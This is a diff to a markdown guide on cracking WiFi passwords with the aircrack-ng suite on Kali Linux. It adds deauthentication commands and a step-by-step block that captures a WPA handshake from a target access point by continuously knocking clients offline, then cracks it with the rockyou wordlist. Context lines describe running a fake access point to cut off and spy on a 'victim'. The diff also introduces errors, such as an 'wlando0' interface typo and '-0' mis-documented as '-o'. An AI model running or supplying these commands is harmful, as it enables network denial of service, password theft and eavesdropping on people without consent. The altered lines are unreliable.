@@ -13,7 +13,7 @@ sudo apt-get install build-essential
 sudo apt-get install libelf-dev 
 
 !Try either of these commands to see which works:
-sudo apt-get install linux-headers-uname -r
+sudo apt-get install linux-headers-`uname -r`
 sudo apt-get install linux-headers-5.10.0-kali6-amd64
 
 sudo apt install dkms
@@ -33,11 +33,11 @@ sudo modprobe 8188eu
 
 !To enable Monitor mode and test packet injection:
 !=================================================
-sudo ifconfig wlan0 down
+sudo ifconfig wlando0 down
 sudo airmon-ng check kill
 sudo iwconfig wlan0 mode monitor
 sudo ifconfig wlan0 up
-iwconfig
+iwconfig                             
 sudo aireplay-ng --test wlan0
 ```
 
@@ -170,9 +170,12 @@ Output
 ```
 # aireplay-ng -0 0 -a BC:98:89:9D:3C:58 -c e4:b3:18:08:c9:79 wlan0mon
 
+# aireplay-ng -0 10 -a 80:35:C1:13:C1:2C wlan0mon
+
+# aireplay-ng --deauth 10 -a [router bssid] interface
 ```
 
-- -0  sets the count of number of deauthentication packets to send to the connected clients, station(s).
+- -o sets the count of number of deauthentication packets to send to the connected clients, station(s).
 - -a  specify or set Access Point MAC Address, this case the BSSID of the WiFi you wish to crack its WEP and WPA-PSK Keys to get its password.
 - -c  specify or set destination MAC address, in this case is the Device, STATION you want to deauthenticate from the WiFi network.
 - wlan0mon  specifies the interface on promiscuous mode.
@@ -692,3 +695,46 @@ I recommend you to try eight digits and ten digits passwords (Numeric  chars). T
 
 21. Check out for active clients. The victim cannot access their internet connection until we stop the process. DHCP and deauth all will stop them from receiving any packets which make them shift to another network i.e. our fake access point or fake network signal In this process, A DOS attack is launched and the victim loses their internet connection and the victim see’s it as “Limited Connection” When you are at this step, you can even eavesdrop on the victim. you can see all the websites they surf, each and every detail is displayed in FAKE DNS
     Now I will show you what happens when the process is started Original network gets disconnected and our newly created fake network with the same name connects to victim’s network and a page pop’s up
+
+
+
+# David Bombal Wifi Hacking Steps
+
+```
+!Verify that monitor mode is used
+sudo airmon-ng 
+
+!You could also use iwconfig to check that interface is in monitor mode:
+iwconfig
+
+! Get the AP's MAC address and channel
+sudo airodump-ng wlan0mon
+
+! AP-MAC & channel - you need to select your own here:
+ESSID: 90:9A:4A:B8:F3:FB
+Channel used by AP for SSID: 2
+
+!1st Window:
+!Make sure you replace the channel number and bssid with your own
+!Replace hack1 with your file name like capture1 or something 
+sudo airodump-ng -w hack1 -c 2 --bssid 90:9A:4A:B8:F3:FB wlan0mon
+
+!2nd Window - deauth attack
+!Make sure you replace the bssid with your own
+sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlan0mon
+
+!Use Wireshark to open hack file
+wireshark hack1-01.cap
+!Filter Wireshark messages for EAPOL
+eapol
+
+!Stop monitor mode
+airmon-ng stop wlan0mon
+
+!Crack file with Rock you or another wordlist
+!Make sure you have rockyou in text format (unzip file on Kali)
+!Replace hack1-01.cap with your file name
+aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt 
+
+```
+
